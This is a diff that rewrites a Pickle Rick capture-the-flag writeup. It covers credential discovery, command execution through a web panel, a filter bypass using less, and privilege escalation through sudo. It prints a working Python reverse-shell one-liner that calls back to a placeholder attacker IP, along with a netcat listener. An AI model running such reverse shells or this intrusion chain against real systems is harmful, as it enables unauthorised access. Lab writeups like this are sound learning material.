@@ -1,75 +1,361 @@
-So first thing first after getting the ip i opened up into the browser and i got this
+# 🖥️ Pickle Rick CTF — Complete Writeup
 
-That is  
+> *A Rick and Morty-themed capture-the-flag challenge. Transform Rick back from a pickle by finding three secret ingredients!*
+
+---
+
+## 🎯 Question 1: What is the First Ingredient that Rick Needs?
+
+### 📍 Reconnaissance & Discovery
+
+After obtaining the target IP address, I opened it in a browser and discovered the initial landing page:
 
 ![homepage.png](homepage.png)
 
-now we are going to do directory bruteforcing to get some hint regarding the password.
+**Initial Approach:**
+- 🔍 Performed directory brute-forcing to uncover hidden endpoints and clues
+- 📄 Inspected the page source code for hidden comments and credentials
 
-But before it we will lookup for the source code in the hope it could somehow help.
+#### 🔐 Username Discovery
 
-and yup we got the username that is 
+Examining the HTML source code revealed a helpful comment:
 
 ```html
-  <!--
-
-    Note to self, remember username!
-
-    Username: R1ckRul3s
-
-  -->
+<!--
+  Note to self, remember username!
+  Username: R1ckRul3s
+-->
 ```
 
-Now we know the username we need to know the endpoint which is needed in login 
+**Finding:** The username is **`R1ckRul3s`**
 
-Now the directroy bruteforcing is crutial.
+### 🛣️ Directory Brute-Force & Endpoint Discovery
 
-In directory bruteforcing there was a robots.txt too which contains this
+Directory brute-forcing proved crucial for identifying the login endpoint. During this process, I discovered an interesting file:
 
+**`robots.txt` Contents:**
 ```text
 Wubbalubbadubdub
 ```
 
-And we are able to find the login endpoint with it it was
+**Findings from Directory Enumeration:**
+- `robots.txt` — Contains a suspicious string (potential password)
+- `/login.php` — The login endpoint
 
-- /login.php
+### 🔓 Authentication & Access
 
-The text inside the robots.txt was the password and we are able to get the login at the edpoint /lgoin.php with the extracted username and password.
+Using the discovered credentials:
+- **Username:** `R1ckRul3s`
+- **Password:** `Wubbalubbadubdub` (from `robots.txt`)
 
-And there is a panel which lets us execute the commands when i did whoami i got _whoami_ i got _www-data_ in replly.
+I successfully logged in at the `/login.php` endpoint.
 
-Meaning command execution is working the endpoint for it was 
-- /portal.php
+### ⚙️ Remote Command Execution Discovery
 
-And it was in-build.
+The login panel revealed a command execution interface at `/portal.php`. Testing with basic commands:
 
-so i did ls -a and i was able to get the contents they were
+```bash
+whoami
+# Output: www-data
+```
 
+**Vulnerable Endpoint:** `/portal.php` (Allows arbitrary command execution as `www-data` user)
 
-- .
-- ..
-- Sup3rS3cretPickl3Ingred.txt
-- assets
-- clue.txt
-- denied.php
-- index.html
-- login.php
-- portal.php
-- robots.txt
+### 📂 Directory Listing & File Enumeration
 
-but doing it access and read content with the same endpiont with cat clue.txt gave me the custom error
+Using `ls -la` to enumerate the current directory:
+
+```bash
+ls -la
+```
+
+**Directory Contents:**
+```
+.
+..
+Sup3rS3cretPickl3Ingred.txt
+assets/
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+```
+
+### ⚠️ Command Filtering Issue
+
+Attempting to read files using `cat` command encountered filtering:
+
+```bash
+cat clue.txt
+# Error: Custom error message (command filtered)
+```
 
 ![error.png](error.png)
 
-Instead i tried directly accesssing the file as robots.txt is in same directory and can be accessed directly using the url
+**Analysis:** The `cat` command is blocked by a filter, likely preventing direct file reading through the command interface.
 
-http://IP/robots.txt
+### 🎯 File Access via Direct URL Access
 
-Similarly i tried to access the Sup3rS3cretPickl3Ingred.txt by 
+Since `robots.txt` was accessible directly via HTTP (without command execution), I tested the same approach for other files:
 
-http://IP/Sup3rS3cretPickl3Ingred.txt
+**Direct URL Access Method:**
+```
+http://[TARGET-IP]/robots.txt
+http://[TARGET-IP]/Sup3rS3cretPickl3Ingred.txt
+```
 
-And i was able to get the content that was the answer of q1.
+✅ **Success!** The file `Sup3rS3cretPickl3Ingred.txt` was accessible via direct URL and contained the first ingredient answer.
+
+---
+
+## 🎯 Question 2: What is the Second Ingredient in Rick's Potion?
+
+### 📋 Clue Discovery
+
+Accessing the clue file via direct URL:
+
+```
+http://[TARGET-IP]/clue.txt
+```
+
+**Clue Content:**
+```text
+Look around the file system for the other ingredient.
+```
+
+**Interpretation:** The second ingredient is located somewhere within the file system, not in the web root.
+
+### 🚫 File Access Restrictions
+
+The portal command execution interface had multiple filters in place:
+- `cat` — Blocked
+- `vim` — Blocked
+- `nano` — Blocked
+
+Viewing the filtered message:
+
+![rick.png](rick.png)
+
+### 🔧 Alternative Command Discovery
+
+**Solution:** Find an alternative file-reading tool installed on the system.
+
+Listing available tools in `/usr/bin`:
+
+```bash
+ls /usr/bin
+```
+
+This revealed numerous tools. After analyzing the output, I identified that the `less` command was available and suitable for reading file contents.
+
+**Testing the `less` command:**
+
+```bash
+less clue.txt
+# Successfully displayed file contents!
+```
+
+✅ **Breakthrough:** The `less` command successfully bypassed the filtering!
+
+### 🧭 File System Navigation
+
+#### Current Working Directory
+
+```bash
+pwd
+# Output: /var/www/html
+```
+
+#### Exploring the Root File System
+
+Attempting to change directories using `cd`:
+
+```bash
+cd /
+pwd
+# Output: Still /var/www/html (cd was filtered/disabled)
+```
+
+**Workaround:** Use absolute paths with commands to explore the file system without relying on `cd`.
+
+#### File System Reconnaissance
+
+```bash
+ls -lah /
+```
+
+This revealed the complete root directory structure, including the `/home` directory.
+
+#### Target Directory Discovery
+
+Exploring the `/home` directory:
+
+```bash
+ls -lah /home
+```
+
+Found a user directory: `rick`
+
+#### Second Ingredient Location
+
+The `/home/rick/` directory contained a suspicious file:
+
+```bash
+ls -lah /home/rick/
+# Found: "second ingredients" (note the space in filename)
+```
+
+### 📖 Reading the Second Ingredient
+
+Using the `less` command to read the file with the space in its name:
+
+```bash
+less /home/rick/second\ ingredients
+```
+
+✅ **Found:** The second ingredient was successfully extracted from this file.
+
+---
+
+## 🎯 Question 3: What is the Last and Final Ingredient?
+
+### 🕵️ System Enumeration & Privilege Escalation
+
+To access the final ingredient (likely in `/root/`), privilege escalation to root is necessary.
+
+### 📊 System Information Gathering
+
+**User and System Information:**
+
+```bash
+id
+# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+whoami
+# Output: www-data
+
+hostname
+# Output: ip-10-48-164-33
+
+uname -a
+# Output: Linux ip-10-48-164-33 5.15.0-1064-aws #70~20.04.1-Ubuntu SMP Fri Jun 14 15:42:13 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+**Current User:** `www-data` (unprivileged web server user)
+
+### 🔐 Sensitive File Analysis
+
+#### `/etc/passwd` — User Enumeration
+
+```bash
+less /etc/passwd
+```
+
+**Key Users Identified:**
+- `root` — Administrator account
+- `ubuntu` — Regular system user
+- `rick` — Secondary user (previously discovered)
+
+#### `/etc/crontab` — Scheduled Task Analysis
+
+```bash
+less /etc/crontab
+```
+
+**Cron Jobs Analysis:**
+```
+# System maintenance tasks - no exploitable entries
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+```
+
+**Conclusion:** No exploitable cron jobs found.
+
+### 📝 Writable Directories Analysis
+
+Identifying directories where the `www-data` user can write files:
+
+```bash
+find / -writable -type d 2>/dev/null
+```
+
+**Writable Locations:**
+```
+/tmp
+/dev/shm
+/var/tmp
+/var/lib/php/sessions
+/var/cache/apache2/mod_cache_disk
+/run/lock
+/home/rick (interesting!)
+[and various other directories]
+```
+
+**Important Finding:** `/home/rick` is writable, indicating the web server has elevated permissions or a weak file permission configuration.
+
+### 🔙 Reverse Shell Acquisition
+
+#### Payload Construction
+
+To gain full interactive access, I executed a Python reverse shell payload:
+
+```bash
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR-IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+```
+
+**Listener Setup (on attacker machine):**
+```bash
+nc -lvnp 4444
+```
+
+✅ **Result:** Obtained an interactive shell as `www-data`
+
+### ⬆️ Privilege Escalation to Root
+
+#### Sudo Privileges Check
+
+```bash
+sudo -l
+```
+
+**Output:**
+```
+Matching Defaults entries for root on ip-10-48-164-33:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User root may run the following commands on ip-10-48-164-33:
+    (ALL : ALL) ALL
+```
+
+**Analysis:** The current user (or an authenticated user) can execute ANY command as root without restrictions.
+
+#### Sudo Privilege Exploitation
+
+With full sudo privileges (`(ALL : ALL) ALL`), gaining a root shell is straightforward:
+
+```bash
+sudo su
+# Or alternatively:
+sudo -i
+```
+
+✅ **Success:** Transitioned to root shell (`root@ip-10-48-164-33:#`)
+
+### 🏆 Final Ingredient Retrieval
+
+With root access, accessing the final ingredient file:
+
+```bash
+cat /root/3rd.txt
+```
+
+✅ **Found:** The third and final ingredient was successfully retrieved from `/root/3rd.txt`
+
+---
 
 Now after accessing the file clue.txt By the url
 
